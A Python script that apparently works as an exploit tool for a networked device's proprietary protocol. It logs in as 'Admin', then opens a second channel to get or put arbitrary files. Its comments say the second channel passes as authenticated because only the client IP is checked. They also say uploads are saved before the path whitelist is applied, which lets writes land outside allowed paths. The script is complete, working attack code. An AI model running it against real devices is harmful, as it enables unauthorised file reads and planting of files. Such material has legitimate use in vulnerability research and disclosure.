import sys
import select
import time
import threading

from lib import decode, Channel

if len(sys.argv) < 5:
  print('python3 %s [host] [adminpw] get [file] >[out]' % sys.argv[0], file=sys.stderr)
  print('python3 %s [host] [adminpw] put [file] <[in]' % sys.argv[0], file=sys.stderr)
  exit(1)

host = sys.argv[1]

uname = b'Admin'
pw = sys.argv[2].encode()

mode = sys.argv[3]
fname = sys.argv[4]

main = Channel(host)
main.connect()

crypt_key = main.login(uname, pw)
if not crypt_key:
  print('Login failed. This method requires valid credentials.')
  exit(1)

# we need to get the cmd id first

cmd_id = 0

while True:
  msg = main.recv_msg()
  if not msg[0]:
    continue

  if len(msg) > 4 and msg[3] == 'CMDID':
    cmd_id = int(msg[4])
    break
  elif len(msg) > 3 and msg[2] == 'CMDID':
    cmd_id = int(msg[3])
    break

print('cmd_id is', cmd_id, file=sys.stderr)

# now we need to start a separate thread which will keep the main channel alive
# this is necessary otherwise the file transfer hangs

class RecvThread(threading.Thread):
  ping_timeout = 5

  def __init__(self, chan, *args, **kwargs):
    self.chan = chan
    self.running = True

    super().__init__(*args, daemon=True, **kwargs)

  def run(self):
    last_ping = time.time()

    while self.running:
      r, _, _ = select.select([self.chan], [], [], self.ping_timeout)

      if self.chan in r:
        x = self.chan.recv()
        # print('recvthread', x, file=sys.stderr)

      now = time.time()
      if now - last_ping > self.ping_timeout:
        # print('recvthread sending ping', file=sys.stderr)
        self.chan.send_msg([])

recv_thread = RecvThread(main)
recv_thread.start()

# having the cmdid, we can open the second channel for file transfer
# it'll appear as authenticated, because what's currently checked is the client's IP
# not sure how sustainable this method is...

tx = Channel(host)
tx.connect()

print("if nothing is displayed within 10 seconds, the device might not support this command.", file=sys.stderr)

if mode == 'put':
  data = sys.stdin.buffer.read()
  data_size = len(data)

  # best checksum algorithm... we just sum all bytes :D
  cksum = sum(data)

  tx.send_msg(['IP', 'CMD', 'FILETRANSPORT', str(cmd_id), '0', str(data_size), str(cksum), '0', fname, '0'])

  resp = tx.recv_msg()
  if resp[4] != 'FILETRANSPORT':
    print("unrecognized response", resp, file=sys.stderr)
    sys.exit(1)

  if resp[5] != '0':
    print("can't upload there", resp, file=sys.stderr)
    sys.exit(1)

  print('sending...')

  for offset in range(0, data_size, 1000):
    tx.send_data(0, data[offset:offset+1000])

  print('sent')

  # we can't really confirm the file has been uploaded correctly
  # that's because theoretically only whitelisted paths work
  # however the file is saved before the whitelist is checked

  resp = tx.recv_msg()
  if resp[4] == 'FILETRANSPORT':
    print('file sent')
  else:
    print("possible error", resp)

else:
  tx.send_msg(['IP', 'CMD', 'FILETRANSPORT', str(cmd_id), '1', '0', '0', '0', fname, '0'])

  resp = tx.recv_msg()
  if resp[4] != 'FILETRANSPORT':
    print("unrecognized response", resp, file=sys.stderr)
    sys.exit(1)

  if resp[5] == '-1':
    print("Can't get that file", file=sys.stderr)
    sys.exit(1)

  target_size = int(resp[6])
  print('file size', target_size, file=sys.stderr)

  while True:
    msgs, data = tx.recv()

    if data:
      st, data = data
      sys.stdout.buffer.write(data)

    if msgs:
      msg = msgs[0]
      if len(msg) > 4 and msg[4] == 'FILETRANSPORT':
        print('file transport complete', file=sys.stderr)
        break

